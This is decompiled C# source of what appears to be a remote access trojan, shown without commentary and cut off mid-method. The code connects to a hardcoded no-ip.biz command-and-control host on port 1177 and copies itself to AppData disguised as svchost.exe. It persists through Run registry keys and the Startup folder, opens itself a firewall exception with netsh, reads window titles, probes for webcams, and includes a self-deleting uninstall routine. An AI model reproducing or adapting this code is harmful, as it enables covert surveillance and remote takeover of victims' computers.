namespace w
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32;
    using System;
    using System.Collections;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.IO.Compression;
    using System.Net;
    using System.Net.Sockets;
    using System.Reflection;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    public class GClass0
    {
        public object object_0 = Conversions.ToBoolean("True");
        public object object_1 = new string(new char[] { '|', '\'', '|', '\'', '|' });
        public object object_10 = new FileInfo(Application.ExecutablePath);
        public object object_11 = "svchost.exe";
        private object object_12;
        public object object_13 = null;
        public object object_14 = 0;
        public object object_15 = "";
        public object object_16 = null;
        public object object_17 = new string(new char[] { '0', '.', '5', '.', '0', 'E' });
        private object object_18 = new string(new char[] { 
            'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 
            'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'C', 'u', 'r', 'r', 'e', 
            'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n', '\\', 'R', 'u', 'n'
         });
        public object object_19 = "SGFDa2Vk";
        public object object_2 = "1177";
        public object object_20 = new Computer();
        public object object_3 = Conversions.ToBoolean("True");
        public object object_4 = "mbotentepang.no-ip.biz";
        public object object_5 = new GClass2();
        public object object_6 = "23556fb1360f366337f97c924e76ead3";
        public object object_7 = new string(new char[] { '[', 'e', 'n', 'd', 'o', 'f', ']' });
        public object object_8 = null;
        public object object_9 = "AppData";

        [DllImport("avicap32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_1);
        [DllImport("psapi")]
        public static extern bool EmptyWorkingSet(long long_0);
        [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("kernel32.dll")]
        private static extern int GetLocaleInfo(uint uint_0, uint uint_1, [Out] StringBuilder stringBuilder_0, int int_0);
        [DllImport("kernel32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, int int_4);
        [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_0);
        [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int GetWindowTextLengthA(long long_0);
        [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);
        [STAThread]
        public static void Main()
        {
            new GClass0().method_32();
        }

        public void method_0(int int_0)
        {
            try
            {
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1d, ref int_0, 4);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public RegistryKey method_1(string string_0)
        {
            string str;
            object[] objArray;
            bool[] flagArray;
            if (string_0.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "ClassesRoot", new object[0], null, null, null), null, "Name", new object[0], null, null, null))))
            {
                str = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "ClassesRoot", new object[0], null, null, null), null, "Name", new object[0], null, null, null), @"\")), "");
                object[] arguments = new object[] { str, true };
                flagArray = new bool[] { true, false };
                if (flagArray[0])
                {
                    str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
                }
                return (RegistryKey) NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "ClassesRoot", new object[0], null, null, null), null, "OpenSubKey", arguments, null, null, flagArray);
            }
            if (string_0.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "Name", new object[0], null, null, null))))
            {
                str = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "Name", new object[0], null, null, null), @"\")), "");
                objArray = new object[] { str, true };
                flagArray = new bool[] { true, false };
                if (flagArray[0])
                {
                    str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(string));
                }
                return (RegistryKey) NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "OpenSubKey", objArray, null, null, flagArray);
            }
            if (string_0.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "LocalMachine", new object[0], null, null, null), null, "Name", new object[0], null, null, null))))
            {
                str = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "LocalMachine", new object[0], null, null, null), null, "Name", new object[0], null, null, null), @"\")), "");
                objArray = new object[] { str, true };
                flagArray = new bool[] { true, false };
                if (flagArray[0])
                {
                    str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(string));
                }
                return (RegistryKey) NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "LocalMachine", new object[0], null, null, null), null, "OpenSubKey", objArray, null, null, flagArray);
            }
            if (!string_0.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "Users", new object[0], null, null, null), null, "Name", new object[0], null, null, null))))
            {
                return null;
            }
            str = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "Users", new object[0], null, null, null), null, "Name", new object[0], null, null, null), @"\")), "");
            objArray = new object[] { str, true };
            flagArray = new bool[] { true, false };
            if (flagArray[0])
            {
                str = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(string));
            }
            return (RegistryKey) NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "Users", new object[0], null, null, null), null, "OpenSubKey", objArray, null, null, flagArray);
        }

        public string method_10()
        {
            string str;
            string str3;
            try
            {
                int num;
                IntPtr foregroundWindow = GetForegroundWindow();
                if (foregroundWindow == IntPtr.Zero)
                {
                    str3 = new string(new char[] { ' ' });
                    return this.method_24(ref str3);
                }
                int windowTextLengthA = GetWindowTextLengthA((long) foregroundWindow);
                string str2 = Strings.StrDup(windowTextLengthA + 1, new string(new char[] { '*' }));
                GetWindowTextA(foregroundWindow, ref str2, windowTextLengthA + 1);
                GetWindowThreadProcessId(foregroundWindow, ref num);
                if (num != 0)
                {
                    try
                    {
                        str = this.method_24(ref Process.GetProcessById(num).MainWindowTitle);
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        str = this.method_24(ref str2);
                        ProjectData.ClearProjectError();
                    }
                    return str;
                }
                str = this.method_24(ref str2);
            }
            catch (Exception exception3)
            {
                ProjectData.SetProjectError(exception3);
                str3 = new string(new char[] { ' ' });
                str = this.method_24(ref str3);
                ProjectData.ClearProjectError();
            }
            return str;
        }

        public void method_11()
        {
            bool[] flagArray;
            object instance = new MemoryStream();
            int num = 0;
        Label_0008:
            try
            {
                Array array;
                if (((this.object_16 == null) || Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "Connected", new object[0], null, null, null), false, false)) || (this.object_14 == null))
                {
                    goto Label_07C6;
                }
                num++;
                if (num > 500)
                {
                    num = 0;
                    if (Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "Poll", new object[] { -1, SelectMode.SelectRead }, null, null, null), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "Available", new object[0], null, null, null), 0, false))))
                    {
                        goto Label_07C6;
                    }
                }
                if (!Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(this.object_16, null, "Available", new object[0], null, null, null), 0, false))
                {
                    goto Label_07BB;
                }
                byte[] buffer = new byte[Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(this.object_16, null, "Available", new object[0], null, null, null), 1)) + 1];
                object[] arguments = new object[] { buffer, 0, buffer.Length, SocketFlags.None };
                flagArray = new bool[] { true, false, false, false };
                NewLateBinding.LateCall(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "Receive", arguments, null, null, flagArray, true);
                if (flagArray[0])
                {
                    buffer = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(byte[]));
                }
                object[] objArray = new object[] { buffer, 0, buffer.Length };
                flagArray = new bool[] { true, false, false };
                NewLateBinding.LateCall(instance, null, "Write", objArray, null, null, flagArray, true);
                if (flagArray[0])
                {
                    buffer = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(byte[]));
                }
                goto Label_0438;
            Label_027E:
                array = this.method_18((byte[]) NewLateBinding.LateGet(instance, null, "ToArray", new object[0], null, null, null), (string) this.object_7);
                new Thread(new ParameterizedThreadStart(this.method_30)).Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array, new object[] { 0 }, null)));
                NewLateBinding.LateCall(instance, null, "Dispose", new object[0], null, null, null, true);
                instance = new MemoryStream();
                if (array.Length != 2)
                {
                    goto Label_07BB;
                }
                object[] objArray5 = new object[3];
                objArray = new object[1];
                int num2 = 1;
                objArray[0] = 1;
                objArray5[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(array, objArray, null));
                objArray5[1] = 0;
                object[] objArray3 = new object[1];
                arguments = objArray3;
                int index = 0;
                object obj3 = 1;
                arguments[0] = RuntimeHelpers.GetObjectValue(obj3);
                object[] objArray4 = arguments;
                string[] argumentNames = null;
                objArray5[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateIndexGet(array, objArray4, argumentNames), null, "length", new object[0], null, null, null));
                object[] objArray6 = objArray5;
                flagArray = new bool[] { true, false, true };
                NewLateBinding.LateCall(instance, null, "Write", objArray6, null, null, flagArray, true);
                if (flagArray[0])
                {
                    NewLateBinding.LateIndexSetComplex(array, new object[] { num2, RuntimeHelpers.GetObjectValue(objArray6[0]) }, null, true, false);
                }
                if (flagArray[2])
                {
                    arguments = objArray3;
                    arguments[index] = RuntimeHelpers.GetObjectValue(obj3);
                    NewLateBinding.LateSetComplex(NewLateBinding.LateIndexGet(array, objArray4, argumentNames), null, "length", new object[] { RuntimeHelpers.GetObjectValue(objArray6[2]) }, null, null, true, true);
                }
            Label_0438:
                obj3 = instance;
                byte[] buffer2 = (byte[]) NewLateBinding.LateGet(obj3, null, "ToArray", new object[0], null, null, null);
                NewLateBinding.LateSetComplex(obj3, null, "ToArray", new object[] { buffer2 }, null, null, true, false);
                if (this.method_19(ref buffer2).Contains((string) this.object_7))
                {
                    goto Label_027E;
                }
                goto Label_07BB;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
                goto Label_07C6;
            }
        Label_04A7:
            try
            {
                NewLateBinding.LateCall(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "Disconnect", new object[] { false }, null, null, null, true);
            }
            catch (Exception exception7)
            {
                ProjectData.SetProjectError(exception7);
                ProjectData.ClearProjectError();
            }
            try
            {
                NewLateBinding.LateCall(instance, null, "Dispose", new object[0], null, null, null, true);
            }
            catch (Exception exception8)
            {
                ProjectData.SetProjectError(exception8);
                ProjectData.ClearProjectError();
            }
            instance = new MemoryStream();
            try
            {
                NewLateBinding.LateCall(this.object_12, null, "Kill", new object[0], null, null, null, true);
                this.object_12 = null;
            }
            catch (Exception exception9)
            {
                ProjectData.SetProjectError(exception9);
                ProjectData.ClearProjectError();
            }
            try
            {
                this.object_16 = new TcpClient();
                NewLateBinding.LateSet(this.object_16, null, "ReceiveTimeout", new object[] { -1 }, null, null);
                NewLateBinding.LateSet(this.object_16, null, "SendTimeout", new object[] { -1 }, null, null);
                NewLateBinding.LateSet(this.object_16, null, "SendBufferSize", new object[] { 0xf423f }, null, null);
                NewLateBinding.LateSet(this.object_16, null, "ReceiveBufferSize", new object[] { 0xf423f }, null, null);
                NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "SendBufferSize", new object[] { 0xf423f }, null, null, false, true);
                NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "ReceiveBufferSize", new object[] { 0xf423f }, null, null, false, true);
                num = 0;
                object[] objArray7 = new object[] { this.object_4, this.object_2 };
                flagArray = new bool[] { true, true };
                NewLateBinding.LateCall(NewLateBinding.LateGet(this.object_16, null, "Client", new object[0], null, null, null), null, "Connect", objArray7, null, null, flagArray, true);
                if (flagArray[0])
                {
                    this.object_4 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray7[0]), typeof(string));
                }
                if (flagArray[1])
                {
                    this.object_2 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray7[1]), typeof(string));
                }
                this.object_14 = 1;
                this.method_8(this.method_27());
                try
                {
                    if (this.method_29("us") == "!")
                    {
                        this.method_8(new string(new char[] { 'u', 's' }));
                    }
                    goto Label_0008;
                }
                catch (Exception exception10)
                {
                    ProjectData.SetProjectError(exception10);
                    this.object_14 = 0;
                    ProjectData.ClearProjectError();
                    goto Label_0008;
                }
            }
            catch (Exception exception11)
            {
                ProjectData.SetProjectError(exception11);
                Thread.Sleep(0x9c4);
                ProjectData.ClearProjectError();
                goto Label_07C6;
            }
        Label_07BB:
            Thread.Sleep(1);
            goto Label_0008;
        Label_07C6:
            this.object_14 = 0;
            goto Label_04A7;
        }

        public void method_12()
        {
            object[] objArray2;
            bool[] flagArray;
            bool[] flagArray2;
            this.method_0(0);
            this.object_5.method_3();
            try
            {
                objArray2 = new object[] { this.object_18, true };
                flagArray = new bool[] { true, false };
                if (flagArray[0])
                {
                    this.object_18 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof(string));
                }
                object[] arguments = new object[] { this.object_6, false };
                flagArray2 = new bool[] { true, false };
                NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "OpenSubKey", objArray2, null, null, flagArray), null, "DeleteValue", arguments, null, null, flagArray2, true);
                if (flagArray2[0])
                {
                    this.object_6 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            try
            {
                object[] objArray3 = new object[] { this.object_18, true };
                flagArray2 = new bool[] { true, false };
                if (flagArray2[0])
                {
                    this.object_18 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof(string));
                }
                object[] objArray = new object[] { this.object_6, false };
                flagArray = new bool[] { true, false };
                NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "LocalMachine", new object[0], null, null, null), null, "OpenSubKey", objArray3, null, null, flagArray2), null, "DeleteValue", objArray, null, null, flagArray, true);
                if (flagArray[0])
                {
                    this.object_6 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(string));
                }
            }
            catch (Exception exception7)
            {
                ProjectData.SetProjectError(exception7);
                ProjectData.ClearProjectError();
            }
            try
            {
                Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(new string(new char[] { 
                    'n', 'e', 't', 's', 'h', ' ', 'f', 'i', 'r', 'e', 'w', 'a', 'l', 'l', ' ', 'd', 
                    'e', 'l', 'e', 't', 'e', ' ', 'a', 'l', 'l', 'o', 'w', 'e', 'd', 'p', 'r', 'o', 
                    'g', 'r', 'a', 'm', ' '
                 }) + "\"", NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), '"')), AppWinStyle.Hide, false, -1);
            }
            catch (Exception exception8)
            {
                ProjectData.SetProjectError(exception8);
                ProjectData.ClearProjectError();
            }
            try
            {
                System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + ((string) this.object_6) + ".exe");
            }
            catch (Exception exception9)
            {
                ProjectData.SetProjectError(exception9);
                ProjectData.ClearProjectError();
            }
            try
            {
                objArray2 = new object[] { this.object_6, false };
                flagArray2 = new bool[] { true, false };
                NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "OpenSubKey", new object[] { new char[] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e' }, true }, null, null, null), null, "DeleteSubKey", objArray2, null, null, flagArray2, true);
                if (flagArray2[0])
                {
                    this.object_6 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof(string));
                }
            }
            catch (Exception exception10)
            {
                ProjectData.SetProjectError(exception10);
                ProjectData.ClearProjectError();
            }
            try
            {
                Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("cmd.exe /k ping 0 & del \"", NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), '"'), " & exit")), AppWinStyle.Hide, false, -1);
            }
            catch (Exception exception11)
            {
                ProjectData.SetProjectError(exception11);
                ProjectData.ClearProjectError();
            }
            ProjectData.EndApp();
        }

        public string method_13(uint uint_0)
        {
            try
            {
                StringBuilder builder = new StringBuilder(0x100);
                int num = GetLocaleInfo(0x400, uint_0, builder, builder.Capacity);
                if (num > 0)
                {
                    return builder.ToString().Substring(0, num - 1);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            return new string(new char[] { 'X' });
        }

        public bool method_14()
        {
            try
            {
                string str2;
                string str = Strings.Space(100);
                int num = 0;
                goto Label_0014;
            Label_000C:
                num++;
                if (num > 4)
                {
                    goto Label_003C;
                }
            Label_0014:
                str2 = null;
                if (!capGetDriverDescriptionA((short) num, ref str, 100, ref str2, 100))
                {
                    goto Label_000C;
                }
                return true;
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        Label_003C:
            return false;
        }

        private bool method_15(FileInfo fileInfo_0, FileInfo fileInfo_1)
        {
            if (fileInfo_0.Name.ToLower() == fileInfo_1.Name.ToLower())
            {
                DirectoryInfo directory = fileInfo_0.Directory;
                DirectoryInfo parent = fileInfo_1.Directory;
                while (directory.Name.ToLower() == parent.Name.ToLower())
                {
                    directory = directory.Parent;
                    parent = parent.Parent;
                    if ((directory == null) & (parent == null))
                    {
                        return true;
                    }
                    if (directory == null)
                    {
                        return false;
                    }
                    if (parent == null)
                    {
                        return false;
                    }
                }
            }
            return false;
        }

        public void method_16()
        {
            bool[] flagArray;
            bool[] flagArray2;
            if (!this.method_15((FileInfo) this.object_10, new FileInfo(Interaction.Environ((string) this.object_9).ToLower() + new string(new char[] { '\\' }) + this.object_11.ToLower())))
            {
                try
                {
                    if (this.method_29("us") == "")
                    {
                        if (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_10, null, "Directory", new object[0], null, null, null), null, "Name", new object[0], null, null, null), null, "Contains", new object[] { new char[] { ':' } }, null, null, null)))
                        {
                            this.method_28("US", "!");
                        }
                        else
                        {
                            this.method_28("US", "@");
                        }
                    }
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    string str = "U0VFX01BU0tfTk9aT05FQ0hFQ0tT";
                    Environment.SetEnvironmentVariable(this.method_23(ref str), "1", EnvironmentVariableTarget.User);
                }
                catch (Exception exception8)
                {
                    ProjectData.SetProjectError(exception8);
                    ProjectData.ClearProjectError();
                }
                try
                {
                    if (System.IO.File.Exists(Interaction.Environ((string) this.object_9) + @"\" + ((string) this.object_11)))
                    {
                        System.IO.File.Delete(Interaction.Environ((string) this.object_9) + @"\" + ((string) this.object_11));
                    }
                    System.IO.File.Copy(Conversions.ToString(NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), Interaction.Environ((string) this.object_9) + new string(new char[] { '\\' }) + ((string) this.object_11), true);
                    Process.Start(Interaction.Environ((string) this.object_9) + new string(new char[] { '\\' }) + ((string) this.object_11));
                    ProjectData.EndApp();
                }
                catch (Exception exception9)
                {
                    ProjectData.SetProjectError(exception9);
                    ProjectData.EndApp();
                    ProjectData.ClearProjectError();
                }
            }
            try
            {
                Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("netsh firewall add allowedprogram \"", NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), '"'), " "), '"'), NewLateBinding.LateGet(this.object_10, null, "Name", new object[0], null, null, null)), '"'), " ENABLE")), AppWinStyle.Hide, false, -1);
            }
            catch (Exception exception10)
            {
                ProjectData.SetProjectError(exception10);
                ProjectData.ClearProjectError();
            }
            try
            {
                object[] arguments = new object[] { this.object_18, true };
                flagArray = new bool[] { true, false };
                if (flagArray[0])
                {
                    this.object_18 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(string));
                }
                object[] objArray4 = new object[] { this.object_6, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject('"', NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), '"'), new char[] { ' ', '.', '.' }) };
                flagArray2 = new bool[] { true, false };
                NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "CurrentUser", new object[0], null, null, null), null, "OpenSubKey", arguments, null, null, flagArray), null, "SetValue", objArray4, null, null, flagArray2, true);
                if (flagArray2[0])
                {
                    this.object_6 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4[0]), typeof(string));
                }
            }
            catch (Exception exception11)
            {
                ProjectData.SetProjectError(exception11);
                ProjectData.ClearProjectError();
            }
            try
            {
                object[] objArray3 = new object[] { this.object_18, true };
                flagArray2 = new bool[] { true, false };
                if (flagArray2[0])
                {
                    this.object_18 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[0]), typeof(string));
                }
                object[] objArray = new object[] { this.object_6, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject('"', NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), '"'), new char[] { ' ', '.', '.' }) };
                flagArray = new bool[] { true, false };
                NewLateBinding.LateCall(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(this.object_20, null, "Registry", new object[0], null, null, null), null, "LocalMachine", new object[0], null, null, null), null, "OpenSubKey", objArray3, null, null, flagArray2), null, "SetValue", objArray, null, null, flagArray, true);
                if (flagArray[0])
                {
                    this.object_6 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(string));
                }
            }
            catch (Exception exception12)
            {
                ProjectData.SetProjectError(exception12);
                ProjectData.ClearProjectError();
            }
            try
            {
                System.IO.File.Copy(Conversions.ToString(NewLateBinding.LateGet(this.object_10, null, "FullName", new object[0], null, null, null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + ((string) this.object_6) + ".exe", true);
            }
            catch (Exception exception13)
            {
                ProjectData.SetProjectError(exception13);
                ProjectData.ClearProjectError();
            }
            Thread.Sleep(0x3e8);
        }

        public byte[] method_17(byte[] byte_0, ref bool bool_0)
        {
            object[] objArray;
            bool[] flagArray;
            if (bool_0)
            {
                object obj3 = new MemoryStream();
                object obj2 = new GZipStream((Stream) obj3, CompressionMode.Compress, true);
                object[] arguments = new object[] { byte_0, 0, byte_0.Length };
                flagArray = new bool[] { true, false, false };
                NewLateBinding.LateCall(obj2, null, "Write", arguments, null, null, flagArray, true);
                if (flagArray[0])
                {
                    byte_0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(byte[]));
                }
                NewLateBinding.LateCall(obj2, null, "Dispose", new object[0], null, null, null, true);
                NewLateBinding.LateSet(obj3, null, "Position", new object[] { 0 }, null, null);
                byte[] buffer2 = new byte[Conversions.ToInteger(NewLateBinding.LateGet(obj3, null, "Length", new object[0], null, null, null)) + 1];
                objArray = new object[] { buffer2, 0, buffer2.Length };
                flagArray = new bool[] { true, false, false };
                NewLateBinding.LateCall(obj3, null, "Read", objArray, null, null, flagArray, true);
                if (flagArray[0])
                {
                    buffer2 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(byte[]));
                }
                NewLateBinding.LateCall(obj3, null, "Dispose", new object[0], null, null, null, true);
                return buffer2;
            }
            object instance = new MemoryStream(byte_0);
            object obj4 = new GZipStream((Stream) instance, CompressionMode.Decompress);
            byte[] buffer4 = new byte[4];
            NewLateBinding.LateSet(instance, null, "Position", new object[] { Operators.SubtractObject(NewLateBinding.LateGet(instance, null, "Length", new object[0], null, null, null), 5) }, null, null);
            objArray = new object[] { buffer4, 0, 4 };
            flagArray = new bool[] { true, false, false };
            NewLateBinding.LateCall(instance, null, "Read", objArray, null, null, flagArray, true);
            if (flagArray[0])
            {
                buffer4 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(byte[]));
            }
            int num = BitConverter.ToInt32(buffer4, 0);
            NewLateBinding.LateSet(instance, null, "Position", new object[] { 0 }, null, null);
            byte[] buffer3 = new byte[(num - 1) + 1];
            objArray = new object[] { buffer3, 0, num };
            flagArray = new bool[] { true, false, true };
            NewLateBinding.LateCall(obj4, null, "Read", objArray, null, null, flagArray, true);
            if (flagArray[0])
            {
                buffer3 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(byte[]));
            }
            if (flagArray[2])
            {
                num = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[2]), typeof(int));
            }
            NewLateBinding.LateCall(obj4, null, "Dispose", new object[0], null, null, null, true);
            NewLateBinding.LateCall(instance, null, "Dispose", new object[0], null, null, null, true);
            return buffer3;
        }

        public Array method_18(byte[] byte_0, string string_0)
        {
            object instance = new List<byte[]>();
            object obj3 = new MemoryStream();
            object obj4 = new MemoryStream();
            string[] strArray = Strings.Split(this.method_19(ref byte_0), string_0, -1, CompareMethod.Binary);
            object[] arguments = new object[] { byte_0, 0, strArray[0].Length };
            bool[] copyBack = new bool[] { true, false, false };
            NewLateBinding.LateCall(obj3, null, "Write", arguments, null, null, copyBack, true);
            if (copyBack[0])
            {
                byte_0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(byte[]));
            }
            object[] objArray = new object[] { byte_0, strArray[0].Length + string_0.Length, byte_0.Length - (strArray[0].Length + string_0.Length) };
            copyBack = new bool[] { true, false, false };
            NewLateBinding.LateCall(obj4, null, "Write", objArray, null, null, copyBack, true);
            if (copyBack[0])
            {
                byte_0 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof(byte[]));
            }
            arguments = new object[1];
            object obj5 = obj3;
            arguments[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj5, null, "ToArray", new object[0], null, null, null));
            objArray = arguments;
            copyBack = new bool[] { true };
            NewLateBinding.LateCall(instance, null, "Add", objArray, null, null, copyBack, true);
            if (copyBack[0])
            {
                NewLateBinding.LateSetComplex(obj5, null, "ToArray", new object[] { RuntimeHelpers.GetObjectValue(objArray[0]) }, null, null, true, false);
